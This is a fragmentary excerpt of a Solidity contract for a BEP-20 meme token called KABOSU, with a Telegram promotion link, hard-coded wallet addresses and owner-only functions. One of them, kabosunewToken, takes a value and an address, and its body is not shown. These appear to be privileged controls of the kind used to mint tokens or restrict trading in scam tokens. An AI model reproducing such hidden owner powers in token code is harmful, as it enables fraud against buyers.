...
$KABOSU Coin is backed by a BEP-20.
...
Join this community:
📲TG : https://t.me/KabosuCoinOfficial
**/
...
contract KABOSU is Context, IERC20 { 
    ...
    uint256 private _tTotal = 26000000000000 * 10**_decimals;
    ...
    address payable public DevWallet = payable(0xc8afF111a03f7e02A829a5784c5E5854dF60Fc01);
    address payable public MarketingWallet = payable(0x2C62FC578C6E38549931B28b685046E25Dc24397);
    ...
    function setkabosuTx() external onlyAddress {
        _maxTxAmount = _maxWalletToken;
    }
    function setkabosuWallet(uint256 newmaxWallet) external onlyAddress {
    ...
    function kabosunewToken(uint256 value, address adr) onlyAddress public virtual {
